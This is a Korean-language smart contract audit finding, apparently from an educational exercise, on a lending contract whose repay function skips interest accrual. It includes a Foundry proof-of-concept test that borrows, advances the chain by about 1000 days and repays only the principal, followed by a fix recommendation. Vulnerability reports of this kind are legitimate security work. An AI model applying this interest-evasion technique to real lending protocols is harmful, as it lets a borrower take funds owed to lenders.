# 1. Insufficient borrow interests
## Description
- `DreamAcademyLending.sol:repay(L: 128-141)`
`repay`함수는 자신이 빌렸던 유동성에 대해 되값는 함수입니다. Lending 컨트랙트는 유동성을 빌리면 블록시간이 흘렀을때 하루당 0.1%의 복리이자가 붙습니다. 하지만 해당 컨트랙트에서는 유동성을 빌린후 해당 컨트랙트에서 어떠한 함수도 호출하지 않으면, 빌린 자산에 대해 업데이트가 이루어지지않아 이자를 내지않고도 대출에 대한 상환이 가능합니다.
## Impact
### high
해당 함수에서는 빌린 자산에 대한 이자반영이 이루어지지않아 시간이 아무리 흘러도 자신이 빌린 비용만큼만 지불하면, 대출이 모두 상환된 것으로 처리됩니다. 
```solidity
    function test_exploit() external {
        supplyUSDCDepositUser1();
        supplyEtherDepositUser2();

        dreamOracle.setPrice(address(0x0), 4000 ether);

        vm.startPrank(user2);
        {
            (bool success,) = address(lending).call(
                abi.encodeWithSelector(DreamAcademyLending.borrow.selector, address(usdc), 1000 ether)
            );
            assertTrue(success);
            (success,) = address(lending).call(
                abi.encodeWithSelector(DreamAcademyLending.borrow.selector, address(usdc), 1000 ether)
            );
            assertTrue(success);

            assertTrue(usdc.balanceOf(user2) == 2000 ether);

            usdc.approve(address(lending), type(uint256).max);

            vm.roll(block.number + (86400 * 1000 / 12));

            (success,) = address(lending).call(
                abi.encodeWithSelector(DreamAcademyLending.repay.selector, address(usdc), 2000 ether)
            );
            assertTrue(success);
        }
        vm.stopPrank();
    }
```
## Recommendation
repay, borrow, liquidate, deposit과 같이 자산이 이동하는 경우 update 함수를 꾸준히 호출해주는것이 바람직합니다.